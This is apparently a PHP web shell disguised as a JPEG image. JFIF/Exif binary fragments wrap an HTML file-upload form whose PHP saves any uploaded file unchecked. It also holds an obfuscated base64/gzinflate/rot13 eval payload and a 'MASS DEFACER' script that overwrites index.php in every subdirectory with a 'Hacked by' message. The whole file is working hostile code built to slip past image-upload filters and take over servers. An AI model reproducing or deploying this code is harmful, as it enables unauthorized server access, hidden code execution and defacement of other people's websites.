����JFIF��x�x������Exif��MM�*����
����E���J����������������(������������������<!--------------------------------------------
blank*
--------------------------------------------->����JFIF��x�x������Exif��MM�*����
����E���J����������������(������������������
<!--------------------------------------------
blank*
--------------------------------------------->
/*
/**************************************************************************************/
*blank*
/**************************************************************************************/
*/
<!--------------------------------------------
blank*
--------------------------------------------->����JFIF��x�x������Exif��MM�*����
����E���J����������������(������������������<!DOCTYPE html>
<html>
<head>
  <title>Upload your files</title>
</head>
<body>
  <form enctype="multipart/form-data" action="" method="POST">
    <p>Upload your file</p>
    <input type="file" name="uploaded_file"></input><br />
    <input type="submit" value="Upload"></input>
  </form>
</body>
</html>
<?PHP
  if(!empty($_FILES['uploaded_file']))
  {
    $path = "";
    $path = $path . basename( $_FILES['uploaded_file']['name']);

    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
      echo "The file ".  basename( $_FILES['uploaded_file']['name']). 
      " has been uploaded";
    } else{
        echo "There was an error uploading the file, please try again!";
    }
  }
?>�����x������x������C�




���C		

����<�d"��������������	
�������}�!1AQa"q2���#B��R��$3br�	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������������	
������w�!1AQaq"2�B����	#3R�br�
$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������?��S��(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(��<!--------------------------------------------
blank*
--------------------------------------------->�����x������x������C�




���C		

����<�d"��������������	
�������}�!1AQa"q2���#B��R��$3br�	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������������	
������w�!1AQaq"2�B����	#3R�br�
$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������?��S��(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(��


<!--------------------------------------------
blank*
--------------------------------------------->����JFIF��x�x������Exif��MM�*����
����E���J����������������(����������������������JFIF��x�x������Exif��MM�*����
����E���J����������������(������������������
<!--------------------------------------------
blank*
--------------------------------------------->����JFIF��x�x������Exif��MM�*����
����E���J����������������(������������������
<!--------------------------------------------
blank*
--------------------------------------------->
/*
/**************************************************************************************/
*blank*
/**************************************************************************************/
*/
<!--------------------------------------------
blank*
--------------------------------------------->
����JFIF��x�x������Exif��MM�*����
����E���J����������������(������������������<?php

eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBaeIQwEEDv/oogTxT8OvTksoXuSd1eV/HQUBcJJlrGuourcBXir6+awhaaWDLzmDeTZGsNogayJw7LivSlVc/U3Ozp9aOgJQmJndjhf3w8pPmG7yQtnkJSlrNG+kHLnTVZGtk3AutrBUuBZekIIEcSUpp/bqAAaCvDOI4bvI1cTitR2PE5TcGDDMUoqEKGSSv0iQKJ7XlHl1K5UYDu2SLL2bSU7B+JiVoO2x4lJXjafjMTBGMVmJClj566FiZeUpegdppg4GUOd6mx6muPve3fPTPCyHvjocdQltM/8Pd0W+9oCGmrJ92zzxrl1T1Gs9yNOuZdbaa69K3S82k/')))));
echo "<title>[ MASS DEFACER ]</title>"; 
echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
echo "<body bgcolor='black'><font color=red'><font face='Electrolize'>";
echo "<center><form method='POST'>";
echo "<br><br><br><font color='lime'>target folder : </font><input cols='20' rows='10' type='text' style='color:lime;background-color:#000000' name='base_dir' value='".getcwd ()."'><br><br>";
echo "<font color='lime'>name of file : </font><input cols='10' rows='10' type='text' style='color:lime;background-color:#000000' name='andela' value='index.php'><br><br>";
echo "<font color='lime'>script deface : </font><br><textarea cols='100' rows='10' style='color:lime;background-color:#000000;background-image:url(http://ac-team.ml/bg.jpg);' name='index'>Hacked by 7r0j4n | LeetGh0sts Squ4d</textarea><br>";
echo "<input type='submit' value='FUCK !'></form></center>";
 
if (isset ($_POST['base_dir']))
{
        if (!file_exists ($_POST['base_dir']))
                die ($_POST['base_dir']." Not Found !<br>");
 
        if (!is_dir ($_POST['base_dir']))
                die ($_POST['base_dir']." Is Not A Directory !<br>");
 
        @chdir ($_POST['base_dir']) or die ("Cannot Open Directory");
 
        $files = @scandir ($_POST['base_dir']) or die ("Fuck u -_- <br>");
 
        foreach ($files as $file):
                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
                {
                        $index = getcwd ()."/".$file."/".$_POST['andela'];
                        if (file_put_contents ($index, $_POST['index']))
                                echo "<font color='lime'>$index&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(&#10003;)</font><br>";
                }
        endforeach;
}; 
?>�����x������x������C�




���C		

����<�d"��������������	
�������}�!1AQa"q2���#B��R��$3br�	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������������	
������w�!1AQaq"2�B����	#3R�br�
$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������?��S��(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(��
<!--------------------------------------------
blank*
--------------------------------------------->�����x������x������C�




���C		

����<�d"��������������	
�������}�!1AQa"q2���#B��R��$3br�	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������������	
������w�!1AQaq"2�B����	#3R�br�
$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������?��S��(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(��

